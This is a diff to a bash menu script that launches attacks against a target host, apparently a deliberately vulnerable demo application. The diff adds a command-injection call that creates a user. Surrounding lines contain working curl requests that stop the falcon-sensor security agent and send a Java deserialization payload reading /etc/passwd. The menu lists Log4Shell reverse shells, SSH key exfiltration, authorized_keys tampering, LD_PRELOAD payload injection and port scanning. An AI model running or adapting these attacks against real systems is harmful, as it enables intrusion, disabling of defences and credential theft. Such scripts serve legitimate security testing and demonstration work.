@@ -223,6 +223,10 @@ performCommandInjectionShutDownSecurityTooling() {
   curl 'http://'"$host"':8081/cmd?arg=systemctl%20stop%20falcon-sensor'
 }
 
+performCommandInjectionAddUser() {
+  curl 'http://'"$host"':8081/cmd?arg=useradd%20newuser'
+}
+
 performDeserializationAttack() {
   curl 'http://'"$host"':8081/deserialize?base64=rO0ABXNyADhvcmcuc3ByaW5nZnJhbWV3b3JrLnNhbXBsZXMuZW1haWxzZXJ2aWNlLm1vZGVsLkVtYWlsRGF0YdBEER%2Fgyw%2FWAgAETAAEYm9keXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wACWNtZFJlc3VsdHEAfgABTAAMZW1haWxBZGRyZXNzcQB%2BAAFMAAdzdWJqZWN0cQB%2BAAF4cHQAD2NhdCAvZXRjL3Bhc3N3ZHB0ABB0ZXN0QGV4YW1wbGUuY29tdAAEdGVzdA%3D%3D'
 }
@@ -236,30 +240,31 @@ display_menu() {
   echo " host: $host"
   echo " jndi server: $jndiserver"
   echo "---------------------"
-  echo "1. SQL Injection"
-  echo "2. Path Traversal Upload"
-  echo "3. Path Traversal Download"
+  echo "1 SQL Injection"
+  echo "2 Path Traversal Upload"
+  echo "3 Path Traversal Download"
   echo "4 Command Injection cat /etc/passwd"
   echo "5 Command Injection cat /etc/shadow"
   echo "6 Command Injection download shared object"
   echo "7 Command Injection upload shadow file"
   echo "8 Command Injection shut down security tooling"
-  echo "9 Perform Deserialization Attack"
-  echo "10. Log4Shell Reverse Shell"
-  echo "11. Log4Shell In App Trojan"
-  echo "12. Read /etc/passwd using Trojan"
-  echo "13. Read System Properties using Trojan"
-  echo "14. list .ssh dir"
-  echo "15. Exfiltrate SSH Private Key"
-  echo "16 Exfiltrate authorized keys"
-  echo "17 Modify authorized keys"
-  echo "18 Exfiltrate app.jar"
-  echo "19 Exfiltrate heapdump"
-  echo "20 Modify .bashrc File"
-  echo "21 Download Malicious Shared Object"
-  echo "22 Write Payload to Preload"
-  echo "23 Port Scan"
-  echo "24 Run all commands in turn"
+  echo "9 Command Injection add user"
+  echo "10 Perform Deserialization Attack"
+  echo "11 Log4Shell Reverse Shell"
+  echo "12 Log4Shell In App Trojan"
+  echo "13 Read /etc/passwd using Trojan"
+  echo "14. Read System Properties using Trojan"
+  echo "15 list .ssh dir"
+  echo "16 Exfiltrate SSH Private Key"
+  echo "17 Exfiltrate authorized keys"
+  echo "18 Modify authorized keys"
+  echo "19 Exfiltrate app.jar"
+  echo "20 Exfiltrate heapdump"
+  echo "21 Modify .bashrc File"
+  echo "22 Download Malicious Shared Object"
+  echo "23 Write Payload to Preload"
+  echo "24 Port Scan"
+  echo "25 Run all commands in turn"
   echo "---------------------"
 }
 
@@ -315,81 +320,86 @@ while true; do
       read -p "Press Enter to continue..."
       ;;
     9)
+      echo "Command Injection add user"
+      performCommandInjectionAddUser
+      read -p "Press Enter to continue..."
+      ;;
+    10)
       echo "Perform Deserialization"
       performDeserializationAttack
       read -p "Press Enter to continue..."
     ;;
-    10)
+    11)
       echo "Log4Shell Reverse Shell"
       performLog4ShellReverseShell
       read -p "Press Enter to continue..."
     ;;
-    11)
+    12)
       echo "Log4Shell In Application Trojan"
       performTrojanInjection
       read -p "Press Enter to continue..."
     ;;
-    12)
+    13)
       echo "Read /etc/passwd using Trojan"
       performEtcPasswordRead
       read -p "Press Enter to continue..."
       ;;
-    13)
+    14)
       echo "Read System Properties using Trojan"
       performSystemPropertiesRead
       read -p "Press Enter to continue..."
       ;;
-    14)
+    15)
       echo "List .ssh directory"
       performListingOfSSHDir
       read -p "Press Enter to continue..."
       ;;
-    15)
+    16)
       echo "Exfiltrate SSH Private Key"
       performReadOfSSHPrivateKey
       read -p "Press Enter to continue..."
       ;;
-    16)
+    17)
       echo "Exfiltrate authorized_keys file"
       performExfiltrateAuthorizedKeys
       read -p "Press Enter to continue..."
       ;;
-    17)
+    18)
       echo "Modify authorized keys"
       performModifyAuthorizedKeys
       read -p "Press Enter to continue..."
       ;;
-    18)
+    19)
       echo "Exfiltrate App jar"
       performExfiltrateAppJar
       read -p "Press Enter to continue..."
       ;;
-    19)
+    20)
       echo "Exfiltrate Heap Dump File"
       performExfiltrateHeapDump
       read -p "Press Enter to continue..."
       ;;
-    20)
+    21)
       echo "Modify .bashrc file"
       performModifyBashRCFile
       read -p "Press Enter to continue..."
       ;;
-    21)
+    22)
       echo "Download Malicious pe.so file"
       performDownloadOfMaliciousSharedObject
       read -p "Press Enter to continue..."
       ;;
-    22)
+    23)
       echo "Inject the Malicious pe.so shared file"
       performWritePayloadToPreload
       read -p "Press Enter to continue..."
       ;;
-    23)
+    24)
       echo "Perform Port Scan"
       performPortScan
       read -p "Press Enter to continue..."
       ;;
-    24)
+    25)
       echo "running all commands, this will take a while"
       performSQLInjection
       performPathTraversalUpload
@@ -399,6 +409,7 @@ while true; do
       performCommandInjectionDownloadSharedObject
       performCommandInjectionUploadShadowFile
       performCommandInjectionShutDownSecurityTooling
+      performCommandInjectionAddUser
       performDeserializationAttack
       performLog4ShellReverseShell
       performTrojanInjection
